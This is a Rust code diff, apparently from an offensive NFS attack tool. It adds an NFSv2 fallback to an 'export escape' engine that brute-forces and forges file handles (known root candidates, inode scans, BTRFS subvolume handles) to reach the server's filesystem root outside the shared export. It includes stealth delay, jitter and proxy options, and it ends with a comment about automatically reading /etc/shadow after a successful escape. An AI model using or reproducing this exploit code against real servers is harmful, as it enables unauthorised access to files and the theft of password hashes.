@@ -264,14 +264,14 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
 
     eprintln!("{}", crate::output::status_info(&format!("{} unique seed handle(s) acquired", seeds.len())));
 
-    // --- Build the NFSv3 probe client (shared across all seeds) ---
+    // --- Build probe clients ---
 
     let direct_port = globals.nfs_port.unwrap_or(2049);
-    let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
-    let probe = Nfs3EscapeProbe { client: &probe_client };
+    let (_, _, v3_probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
+    let v3_probe = Nfs3EscapeProbe { client: &v3_probe_client };
     let config = EscapeConfig { btrfs_subvols, max_root_scan, announce: true };
 
-    // --- Run find_escape_root_all on each seed, collecting all results ---
+    // --- Run find_escape_root_all on each seed via v3, collecting all results ---
 
     let mut all_results: Vec<AllEscapeResult> = Vec::new();
     let mut seen_root_bytes: HashSet<Vec<u8>> = HashSet::new();
@@ -280,10 +280,33 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
         eprintln!();
         eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} ...", seed.source)));
 
-        let hits = find_escape_root_all(&probe, seed.handle.as_bytes(), &config).await;
+        let hits = find_escape_root_all(&v3_probe, seed.handle.as_bytes(), &config).await;
         for hit in hits {
             if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
                 all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
+            }
+        }
+    }
+
+    // --- If v3 found nothing, retry all seeds via v2 probe ---
+    // v2-only servers (kernel 2.6.x) reject v3 GETATTR with PROG_MISMATCH;
+    // the v2 probe speaks the right protocol version.
+    if all_results.is_empty() {
+        let (_, _, v2_probe_client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
+        let v2_probe = Nfs2EscapeProbe { client: &v2_probe_client };
+
+        eprintln!();
+        eprintln!("{}", crate::output::status_info("v3 probe found nothing -- retrying seeds with NFSv2 probe"));
+
+        for seed in &seeds {
+            eprintln!();
+            eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} (v2 probe) ...", seed.source)));
+
+            let hits = find_escape_root_all(&v2_probe, seed.handle.as_bytes(), &config).await;
+            for hit in hits {
+                if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
+                    all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
+                }
             }
         }
     }
@@ -556,6 +579,26 @@ impl EscapeProbe for Nfs3EscapeProbe<'_> {
         let fh = FileHandle::from_bytes(dir);
         let (child, _) = self.client.resolve(&fh, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
         Ok(child.as_bytes().to_vec())
+    }
+}
+
+/// NFSv2 escape probe: wraps an `Nfs2Client` so the escape engine can
+/// probe candidate handles on v2-only servers (kernel 2.6.x, no v3/v4).
+struct Nfs2EscapeProbe<'a> {
+    client: &'a crate::proto::nfs2::Nfs2Client,
+}
+
+impl EscapeProbe for Nfs2EscapeProbe<'_> {
+    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
+        let fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(handle);
+        let attrs = self.client.getattr(&fh).await.map_err(|e| anyhow::anyhow!("{e}"))?;
+        Ok((attrs.ftype == nfs_v2::wire::FType::Directory, u64::from(attrs.fileid)))
+    }
+
+    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
+        let fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(dir);
+        let (child, _) = self.client.lookup(&fh, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
+        Ok(child.0.to_vec())
     }
 }
 
@@ -1072,86 +1115,27 @@ async fn find_escape_matrix(host: &str, export: &str, btrfs_subvols: u32, max_ro
 
 /// NFSv2 escape path for v2-only servers.
 ///
-/// Uses MOUNT v1 to obtain the seed handle and Nfs2Client for GETATTR probes.
-/// NFSv2 has no BADHANDLE oracle (all rejections are NFSERR_STALE per RFC 1094)
-/// and handles are fixed 32 bytes. No post-escape shadow read (v2 has no ACCESS).
+/// Uses MOUNT v1 to obtain the seed handle and `Nfs2EscapeProbe` for GETATTR
+/// probes through the full escape engine (known candidates, BTRFS subvols,
+/// FS-specific constructors, brute-force scan).
 async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<EscapeOutcome> {
-    use nfs_v2::wire::{FType, Nfs2FileHandle};
-
     let addr = parse_addr_with_port(host, globals.nfs_port)?;
     let mc = make_mount_client(globals);
     let mnt = mc.mount_v1(addr, export).await?;
     let seed = mnt.handle;
 
     let stealth = StealthConfig::new(globals.delay, globals.jitter);
-    let (_pool, _circuit, client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+    let direct_port = globals.nfs_port.unwrap_or(2049);
+    let (_pool, _circuit, client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth, globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
 
-    // Guard: if the export already IS the filesystem root there is nothing outside the
-    // export to reach. NFSv2 handles are opaque 32-byte blobs without a Linux header, so
-    // we cannot use fingerprint_fs; instead check the export root's fileid directly.
-    // fileid 2 = ext4/ext3 root; 32/64/128 = XFS root (varies by inode size).
-    let export_fh = Nfs2FileHandle::from_bytes(seed.as_bytes());
-    if let Ok(attrs) = client.getattr(&export_fh).await
-        && attrs.ftype == FType::Directory
-        && matches!(attrs.fileid, 2 | 32 | 64 | 128)
-    {
-        eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
-        return Ok(EscapeOutcome::Unsupported);
+    let probe = Nfs2EscapeProbe { client: &client };
+    let config = EscapeConfig { btrfs_subvols: DEFAULT_BTRFS_SUBVOLS, max_root_scan, announce: true };
+
+    match find_escape_root(&probe, seed.as_bytes(), &config).await {
+        EscapeRootOutcome::Success(candidate) => Ok(EscapeOutcome::Success { candidate, note: "verified (NFSv2)".to_owned() }),
+        EscapeRootOutcome::StaleNoRoot => Ok(EscapeOutcome::StaleNoRoot),
+        EscapeRootOutcome::Unsupported => Ok(EscapeOutcome::Unsupported),
     }
-
-    let mut found_stale = false;
-
-    // Phase 1: known root candidates
-    let known = FileHandleAnalyzer::construct_root_candidates(&seed);
-    for candidate in &known {
-        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
-        match client.getattr(&fh).await {
-            Ok(a) if a.ftype == FType::Directory => {
-                return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "verified (NFSv2)".to_owned() });
-            },
-            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
-                found_stale = true;
-            },
-            _ => {},
-        }
-    }
-
-    // Phase 2: inode scan
-    for inode in 2..=max_root_scan {
-        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&seed, inode, 0);
-        for candidate in candidates {
-            let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
-            match client.getattr(&fh).await {
-                Ok(a) if a.ftype == FType::Directory => {
-                    return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
-                },
-                Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
-                    found_stale = true;
-                },
-                _ => {},
-            }
-        }
-    }
-
-    // Phase 3: BTRFS subvolume handles.
-    // BTRFS handles are 32 bytes on Linux knfsd, matching NFSv2's fixed FHSIZE exactly.
-    // construct_btrfs_subvol_handles returns variable-length FileHandles; Nfs2FileHandle::from_bytes
-    // takes the first 32 bytes (or pads shorter handles with zeros).
-    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&seed, DEFAULT_BTRFS_SUBVOLS);
-    for candidate in &btrfs {
-        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
-        match client.getattr(&fh).await {
-            Ok(a) if a.ftype == FType::Directory => {
-                return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified, NFSv2)".to_owned() });
-            },
-            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
-                found_stale = true;
-            },
-            _ => {},
-        }
-    }
-
-    Ok(if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported })
 }
 
 /// After a successful escape, automatically try to read /etc/shadow.
